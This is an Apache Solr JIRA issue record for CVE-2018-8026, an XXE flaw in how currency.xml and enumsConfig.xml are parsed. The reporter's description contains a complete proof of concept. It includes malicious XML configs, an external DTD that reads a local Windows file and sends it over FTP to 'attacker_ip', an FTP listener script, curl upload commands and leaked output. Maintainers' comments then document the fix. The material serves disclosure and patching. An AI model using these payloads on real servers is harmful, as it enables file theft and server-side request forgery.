{
    "id": "SOLR-12450",
    "title": "CVE-2018-8026: More XXE vulns in code using DocumentBuilder",
    "details": {
        "labels": "",
        "priority": "Major",
        "components": [
            "security"
        ],
        "type": "Bug",
        "fix_versions": [
            "6.6.5",
            "7.4"
        ],
        "affect_versions": "6.6.4,                                            7.3.1",
        "resolution": "Fixed",
        "status": "Closed"
    },
    "description": "From: yuyang xiao <superxyyang@gmail.com>\nDate: Mon, Jun 4, 2018 at 10:22 AM\nSubject: XXE vulns in lucene-solr\nTo: security@apache.org\n\nTitle: XXE vulns in lucene-solr\n\nAuthor: XiaoXiong , superxyyang@gmail.com\n\nDate: 2018-06-04\n\nDownload Site: http://www.apache.org/dyn/closer.lua/lucene/solr/7.3.1\n\nVulnerability:\n\nRecently, I found there are two another XXE Vulnerabilities. unsecure DocumentBuilderFactory is being used to parse currency.xml and enumsConfig.xml .\u00a0\u00a0\nI think the problem is as serious as CVE-2018-8010, It can result in reading any file and server side request forgery attack .I think it a dangerous vulnerability that you should limit the xml entity parse.\n\n\u00a0\n\nThe location of vulnerability one :\n\nhttps://github.com/apache/lucene-solr/blob/master/solr/core/src/java/org/apache/solr/schema/FileExchangeRateProvider.java\n\n\nis = loader.openResource(currencyConfigFile);\n\njavax.xml.parsers.DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n\ntry {\n\ndbf.setXIncludeAware(true);\ndbf.setNamespaceAware(true);\n\n} catch (UnsupportedOperationException e) {\n\nthrow new SolrException(SolrException.ErrorCode.BAD_REQUEST, \"XML parser doesn't support XInclude option\", e);\n}\n\u00a0\nDocument doc = dbf.newDocumentBuilder().parse(is);\n\n\n\u00a0\nthe another xxe\u00a0 vulnerability \u00a0 \nhttps://github.com/apache/lucene-solr/blob/master/solr/core/src/java/org/apache/solr/schema/AbstractEnumField.java\n\n\nis = schema.getResourceLoader().openResource(enumsConfigFile);\n\nfinal DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();\n\nfinal Document doc = dbf.newDocumentBuilder().parse(is);\nfinal XPathFactory xpathFactory = XPathFactory.newInstance();\nfinal XPath xpath = xpathFactory.newXPath();\n\n\n\nThe following is the\u00a0 vulnerability\u00a0 detail:\n\nDetail\nFileExchangeRateProvider Vulnerability\nenvironment:\nvictim :\n\nSolr version: solr 7.3.1 OS: windows 7\u00a0 java version \"1.8.0_101\"IP: victim_ip\n\nattacker:\n\nOS: kaliIP: attacker_ip\n\nStep 1: Create configeset with three files in directory called \"test\"\nschema.xml: import the currency handler\n\n<schema name=\"test\" version=\"1.1\">\u00a0 <fieldType name=\"string\" class=\"solr.StrField\"/>\u00a0\u00a0\u00a0 <fieldType name=\"currency\" class=\"solr.CurrencyField\" precisionStep=\"8\" defaultCurrency=\"USD\" currencyConfig=\"currency.xml\" /></schema>\n\n\n\ncurrency.xml: import the attack payload\n\n<?xml version=\"1.0\"?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM \"http://attacker_ip:9000/xxe.dtd\">\u00a0\u00a0\u00a0 %remote;\u00a0\u00a0\u00a0 ]>\u00a0 <currencyConfig version=\"1.0\">\u00a0 <rates>\u00a0\u00a0\u00a0 <!-- Updated from http://www.exchangerate.com/ at 2011-09-27 -->\u00a0\u00a0\u00a0 <rate from=\"USD\" to=\"ARS\" rate=\"4.333871\" comment=\"ARGENTINA Peso\" />\u00a0\u00a0\u00a0 <rate from=\"USD\" to=\"AUD\" rate=\"1.025768\" comment=\"AUSTRALIA Dollar\" />\u00a0\u00a0\u00a0 <rate from=\"USD\" to=\"EUR\" rate=\"0.743676\" comment=\"European Euro\" />\u00a0\u00a0\u00a0 <rate from=\"USD\" to=\"CAD\" rate=\"1.030815\" comment=\"CANADA Dollar\" />\u00a0\u00a0\u00a0\u00a0 <!-- Cross-rates for some common currencies -->\u00a0\u00a0\u00a0 <rate from=\"EUR\" to=\"GBP\" rate=\"0.869914\" />\u00a0\u00a0\u00a0 <rate from=\"EUR\" to=\"NOK\" rate=\"7.800095\" />\u00a0\u00a0\u00a0 <rate from=\"GBP\" to=\"NOK\" rate=\"8.966508\" />\u00a0\u00a0\u00a0\u00a0 <!-- Asymmetrical rates -->\u00a0\u00a0\u00a0 <rate from=\"EUR\" to=\"USD\" rate=\"0.5\" />\u00a0 </rates></currencyConfig>\n\n\n\nsolrconfig.xml: normal config file\n\n<config>\u00a0 <dataDir>${solr.data.dir:}</dataDir>\u00a0 <directoryFactory name=\"DirectoryFactory\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 class=\"${solr.directoryFactory:solr.NRTCachingDirectoryFactory}\"/>\u00a0 <schemaFactory class=\"ClassicIndexSchemaFactory\"/>\u00a0 <luceneMatchVersion>7.3.1</luceneMatchVersion>\u00a0 <updateHandler class=\"solr.DirectUpdateHandler2\">\u00a0\u00a0\u00a0 <commitWithin>\u00a0\u00a0\u00a0\u00a0\u00a0 <softCommit>${solr.commitwithin.softcommit:true}</softCommit>\u00a0\u00a0\u00a0 </commitWithin>\u00a0 </updateHandler>\u00a0 <requestHandler name=\"/select\" class=\"solr.SearchHandler\">\u00a0\u00a0\u00a0 <lst name=\"defaults\">\u00a0\u00a0\u00a0\u00a0\u00a0 <str name=\"echoParams\">explicit</str>\u00a0\u00a0\u00a0\u00a0\u00a0 <str name=\"indent\">true</str>\u00a0\u00a0\u00a0\u00a0\u00a0 <str name=\"df\">text</str>\u00a0\u00a0\u00a0\u00a0\u00a0 <str name=\"password\">passwdFile</str>\u00a0\u00a0\u00a0 </lst>\u00a0 </requestHandler></config>\n\n\n\nStep 2: Upload the test directory to Solr using configset upload API:\n\n(cd test && zip -r - *) | curl -X POST --header \"Content-Type:application/octet-stream\" --data-binary @- \"http://victim_ip:8983/solr/admin/configs?action=UPLOAD&name=configset1\"\n\n\n\nStep3: ready the xxe.dtd\nfor Solr server read xxe.dtd\n\npython -m SimpleHTTPServer 9000\n\nxxe.dtd:\n\n\n<!ENTITY % file SYSTEM \"file:///C:/Windows/win.ini\"><!ENTITY % int \"<!ENTITY &#37; send SYSTEM 'ftp://user:12345@attacker_ip:2121/%file;/'>\">%int;%send;\n\n\n\nStep4: build the listening with ftp\npython ftpserver.py >> ./ftpserver.log 2>&1 &\n\nftpserver.py:\n\nimport osfrom pyftpdlib.authorizers import DummyAuthorizerfrom pyftpdlib.handlers import FTPHandlerfrom pyftpdlib.servers import FTPServer\u00a0def main():\u00a0\u00a0\u00a0 # Instantiate a dummy authorizer for managing 'virtual' users\u00a0\u00a0\u00a0 authorizer = DummyAuthorizer()\u00a0\u00a0\u00a0\u00a0 # Define a new user having full r/w permissions and a read-only\u00a0\u00a0\u00a0 # anonymous user\u00a0\u00a0\u00a0 authorizer.add_user('user', '12345', '.', perm='elradfmwMT')\u00a0\u00a0\u00a0 authorizer.add_anonymous(os.getcwd(), perm='elradfmwMT')\u00a0\u00a0\u00a0\u00a0 # Instantiate FTP handler class\u00a0\u00a0\u00a0 handler = FTPHandler\u00a0\u00a0\u00a0 handler.authorizer = authorizer\u00a0\u00a0\u00a0\u00a0 # Define a customized banner (string returned when client connects)\u00a0\u00a0\u00a0 handler.banner = \"pyftpdlib based ftpd ready.\"\u00a0\u00a0\u00a0\u00a0 # Instantiate FTP server class and listen on 0.0.0.0:2121\u00a0\u00a0\u00a0 address = ('', 2121)\u00a0\u00a0\u00a0 server = FTPServer(address, handler)\u00a0\u00a0\u00a0\u00a0 # set a limit for connections\u00a0\u00a0\u00a0 server.max_cons = 256\u00a0\u00a0\u00a0 server.max_cons_per_ip = 5\u00a0\u00a0\u00a0\u00a0 # start ftp server\u00a0\u00a0\u00a0 server.serve_forever()\u00a0if __name__ == '__main__':\u00a0\u00a0\u00a0 main()\n\n\n\nStep5: Create a collection using this configset. and the file is revealed\ninput the url\n\nhttp://victim_ip:8983/solr/admin/collections?action=CREATE&name=mybadcoll&numShards=1&collection.configName=configset1\"\n\nread the error response\n\n\n{\u00a0 \"responseHeader\":{\u00a0\u00a0\u00a0 \"status\":0,\u00a0\u00a0\u00a0 \"QTime\":32895},\u00a0 \"failure\":{\u00a0\u00a0\u00a0 \"victim_ip:7574_solr\":\"org.apache.solr.client.solrj.impl.HttpSolrClient$RemoteSolrException:Error from server at http://victim_ip:7574/solr: Error CREATEing SolrCore 'mybadcoll_shard1_replica_n1': Unable to create core [mybadcoll_shard1_replica_n1] Caused by: CWD ; for 16-bit app support\\n[fonts]\\n[extensions]\\n[mci extensions]\\n[files]\\n[Mail]\\nMAPI=1\\nCMCDLLNAME32=mapi32.dll\\nCMC=1\\nMAPIX=1\\nMAPIXVER=1.0.0.1\\nOLEMessaging=1\\n[MCI Extensions.BAK]\\n3g2=MPEGVideo\\n3gp=MPEGVideo\\n3gp2=MPEGVideo\\n3gpp=MPEGVideo\\naac=MPEGVideo\\nadt=MPEGVideo\\nadts=MPEGVideo\\nm2t=MPEGVideo\\nm2ts=MPEGVideo\\nm2v=MPEGVideo\\nm4a=MPEGVideo\\nm4v=MPEGVideo\\nmod=MPEGVideo\\nmov=MPEGVideo\\nmp4=MPEGVideo\\nmp4v=MPEGVideo\\nmts=MPEGVideo\\nts=MPEGVideo\\ntts=MPEGVideo\\n:550 File name too long.\\n\"}}\n\n\n\nAbstractEnumField Vulnerability\nThe process is the same with FileExchangeRateProvider under certain circumstance\n\nschema.xml:\n\n<schema name=\"test1\" version=\"1.1\">\u00a0\u00a0\u00a0 <fieldType name=\"string\" class=\"solr.StrField\"/>\u00a0\u00a0\u00a0 <fieldType name=\"priorityLevel\" class=\"solr.EnumFieldType\" docValues=\"true\" enumsConfig=\"enumsConfig.xml\" enumName=\"priority\"/>\u00a0\u00a0\u00a0 <fieldType name=\"riskLevel\"\u00a0\u00a0\u00a0\u00a0 class=\"solr.EnumFieldType\" docValues=\"true\" enumsConfig=\"enumsConfig.xml\" enumName=\"risk\"\u00a0\u00a0\u00a0 /></schema>\n\n\n\nenumsConfig.xml\n\n<?xml version=\"1.0\" ?><!DOCTYPE ANY[<!ENTITY % remote SYSTEM \"http://attacker_ip:9000/xxe.dtd\"> %remote;]>\u00a0<enumsConfig>\u00a0 <enum name=\"priority\">\u00a0\u00a0\u00a0 <value>Not Available</value>\u00a0\u00a0\u00a0 <value>Low</value>\u00a0\u00a0\u00a0 <value>Medium</value>\u00a0\u00a0\u00a0 <value>High</value>\u00a0\u00a0\u00a0 <value>Urgent</value> \u00a0</enum>\u00a0 <enum name=\"risk\">\u00a0\u00a0\u00a0 <value>Unknown</value>\u00a0\u00a0\u00a0 <value>Very Low</value>\u00a0\u00a0\u00a0 <value>Low</value>\u00a0\u00a0\u00a0 <value>Medium</value>\u00a0\u00a0\u00a0 <value>High</value>\u00a0\u00a0\u00a0 <value>Critical</value>\u00a0 </enum></enumsConfig>",
    "attachments": {
        "SOLR-12450.patch": "https://issues.apache.org/jira/secure/attachment/12926593/SOLR-12450.patch"
    },
    "issue_links": {},
    "comments": [
        {
            "date": "2018-06-05T08:06:09+0000",
            "content": "TODO: We should now review all usages of document builders, sax parsers and Stax parsers, if they are missing entity resolvers added (to either disable external entities and xinclude completely or use the system id resover for config files. We should also review if we can factor out config file parsing and forbid usage of native XML APIs by usage of forbiddenapis. ",
            "author": "Uwe Schindler",
            "id": "comment-16501443"
        },
        {
            "date": "2018-06-05T08:39:05+0000",
            "content": "CVE was assigned: CVE-2018-8026 ",
            "author": "Uwe Schindler",
            "id": "comment-16501484"
        },
        {
            "date": "2018-06-05T16:27:34+0000",
            "content": "I attached a patch fixing those issues. I added all code parts also to exchange rate provider and enum config:  SOLR-12450.patch \n\nThe reason for this bug was that it was copypasted at some pont in former time, before my fixes to prevent XXE 3 years ago were applied. I am quite sure that i went through all the document builders, so it must have been commited since that. \n\nI will now check at least all DocumentBuilder/DocumentBuilderFactories by searching for db.parse() n the source code and verify their usage.\n\nMaybe we should add a utility method to solr that allows to load a DOM tree (Document) from an XML file in the config directory using SolrResourceLoader. This can be made safe but still support entities and xinclude. Still, I have no idea how to effectively prevent those bugs from appearing agin. Maybe we should forbid direct usage of DocumentBuilder and DocumentBuilder factory by forbiddenapis and just add a supresswarnings in our utility method.\n ",
            "author": "Uwe Schindler",
            "id": "comment-16502049"
        },
        {
            "date": "2018-06-10T07:46:05+0000",
            "content": "Hi,\nI am working on a \"safe\" solution. My proposal: Add a utility class to Solr (that has forbiddenapis disabled) that can be used to parse XML sources to DOM trees (and in 2nd step also for StAX and ContentHandlers). This static utility class will have a methods for parsing an XML:\n\n\tfrom the SolrResourceLoader (means from config dir or zookeeper). This parser will have external entities enabled and also xinclude (like all solr config files), but it uses the entity resolver that only allows resources loaded from the resourceloader (that cannot escape instance/config dir). All other URL protocols are rejected (except solrres://, which is used internaly for resolving).\n\tfor xml sources from network (e.g., parameters in request or the request body). Those will not allow any external entities. I'd like to change that to throw an error (currently it ignores external entities and returns empty stream).\n\n\n\nI can then add javax.xml.parsers.* to forbiddenapis. I will investigate the same for StAX, but there we have to exclude specific classes.\n\nAfter doing this, I already found another possible XXE in DIH: org.apache.solr.handler.extraction.ParseContextConfig. I will fix this, too. We can discuss on BBUZZ2018, I will prepare patch (or branch depends on how large) on my train ride. Currently a lot of tests do unsafe parsing (whioch is not a problem), but to pass forbiddenapis, I have to change them to use the wrapper API provided by Solr. ",
            "author": "Uwe Schindler",
            "id": "comment-16507295"
        },
        {
            "date": "2018-06-14T17:26:31+0000",
            "content": "I am still working on this. So I attached a patch, which only introduces SafeXMLParsing, but only uses it to fix the bugs mentioned here and also the new problem I found (TIKA ParseConfig file): SOLR-12450.patch \n\nTo not block the release of Solr 7.4, I think we should do this first. But it may still leave some not yet found XXEs.\n\nThis patch also shows the API of my new class. ",
            "author": "Uwe Schindler",
            "id": "comment-16512789"
        },
        {
            "date": "2018-06-14T17:29:47+0000",
            "content": "I'd go forward and commit/merge that patch from my private branch to master/7.x and proceed with release. Adrien Grand?\n\nI will proceed with working on the full fix. But that is more risky and not backportable into bugfix branches, as it dramatically changes Config.kava APIs! So it's good to have a patch for the current security issue and one more that I found while investigating. ",
            "author": "Uwe Schindler",
            "id": "comment-16512793"
        },
        {
            "date": "2018-06-15T06:34:37+0000",
            "content": "Uwe Schindler Makes sense to me. I'll propose to build a first RC on Monday on the dev list. ",
            "author": "Adrien Grand",
            "id": "comment-16513419"
        },
        {
            "date": "2018-06-15T06:37:53+0000",
            "content": "OK. I will do the merge on Sunday afternoon, to have it in public as short as possible. The commit message will be similar to last time, something with \"don't allow to refer to external files in config foo bar\".\n\nThe question is: What other security releases do we want to do? 7.3.x, 6.6 again? ",
            "author": "Uwe Schindler",
            "id": "comment-16513428"
        },
        {
            "date": "2018-06-17T11:05:59+0000",
            "content": "I added a test for SafeXMLParsing:  SOLR-12450.patch \n\nWill commit in a moment and backport to 7.x and 7.4 branches. ",
            "author": "Uwe Schindler",
            "id": "comment-16515050"
        },
        {
            "date": "2018-06-17T11:17:12+0000",
            "content": "I also added Xinclude test. ",
            "author": "Uwe Schindler",
            "id": "comment-16515052"
        },
        {
            "date": "2018-06-17T11:29:44+0000",
            "content": "Committed to master, 7.x and 7.4 branches. Adrien Grand: Go forward with release! ",
            "author": "Uwe Schindler",
            "id": "comment-16515055"
        },
        {
            "date": "2018-06-18T08:46:35+0000",
            "content": "Thanks Uwe Schindler! ",
            "author": "Adrien Grand",
            "id": "comment-16515498"
        },
        {
            "date": "2018-06-29T11:59:27+0000",
            "content": "I've backported this to branch_6x (https://github.com/apache/lucene-solr/commit/1880d4824e6c5f98170b9a00aad1d437ee2aa12b) and branch_6_6 (https://github.com/apache/lucene-solr/commit/d1baf6ba593561f39e2da0a71a8440797005b55c). ",
            "author": "Ishan Chattopadhyaya",
            "id": "comment-16527522"
        },
        {
            "date": "2018-07-04T16:28:44+0000",
            "content": "We won't backport this to 5.x. ",
            "author": "Uwe Schindler",
            "id": "comment-16532931"
        },
        {
            "date": "2018-07-04T16:30:57+0000",
            "content": "Releases 7.4.0 and 6.6.5 of Apache Solr are fixing this issue.\n\nTo prevent this problem in the future, I will open a separate issue to actually put DocumentBuilder & Co. on the forbidden APIs list. This involves API changes around Config class, so this was delayed to the next major release. ",
            "author": "Uwe Schindler",
            "id": "comment-16532934"
        },
        {
            "date": "2018-07-04T16:35:22+0000",
            "content": "Commit 5ec0a3f4226f61af9ada3a032c45391ae69f5cb1 in lucene-solr's branch refs/heads/master from Uwe Schindler\n[ https://git-wip-us.apache.org/repos/asf?p=lucene-solr.git;h=5ec0a3f ]\n\nSOLR-12450: Add CVE number to changelog ",
            "author": "ASF subversion and git services",
            "id": "comment-16532937"
        },
        {
            "date": "2018-07-04T16:36:30+0000",
            "content": "Commit 4f9767ca071c12888b8f222b12b1c067a46a9784 in lucene-solr's branch refs/heads/branch_7x from Uwe Schindler\n[ https://git-wip-us.apache.org/repos/asf?p=lucene-solr.git;h=4f9767c ]\n\nSOLR-12450: Add CVE number to changelog ",
            "author": "ASF subversion and git services",
            "id": "comment-16532939"
        },
        {
            "date": "2018-07-04T16:37:38+0000",
            "content": "Commit 1cd10c108a00225919c3b1c4ad98d2f418be6b28 in lucene-solr's branch refs/heads/branch_7_4 from Uwe Schindler\n[ https://git-wip-us.apache.org/repos/asf?p=lucene-solr.git;h=1cd10c1 ]\n\nSOLR-12450: Add CVE number to changelog ",
            "author": "ASF subversion and git services",
            "id": "comment-16532945"
        },
        {
            "date": "2018-07-04T16:41:32+0000",
            "content": "Commit 0b2e8e3ac53987cbd4c8e6422b68070ec32b9c54 in lucene-solr's branch refs/heads/branch_6x from Uwe Schindler\n[ https://git-wip-us.apache.org/repos/asf?p=lucene-solr.git;h=0b2e8e3 ]\n\nSOLR-12450: Add CVE number to changelog\n\n\n\tConflicts:\n\tsolr/CHANGES.txt\n\n ",
            "author": "ASF subversion and git services",
            "id": "comment-16532947"
        },
        {
            "date": "2018-07-04T16:42:36+0000",
            "content": "Commit 34c95e2d386d1ad0092674e3cf6f499b3ad28073 in lucene-solr's branch refs/heads/branch_6_6 from Uwe Schindler\n[ https://git-wip-us.apache.org/repos/asf?p=lucene-solr.git;h=34c95e2 ]\n\nSOLR-12450: Add CVE number to changelog\n\n\n\tConflicts:\n\tsolr/CHANGES.txt\n\n ",
            "author": "ASF subversion and git services",
            "id": "comment-16532948"
        }
    ]
}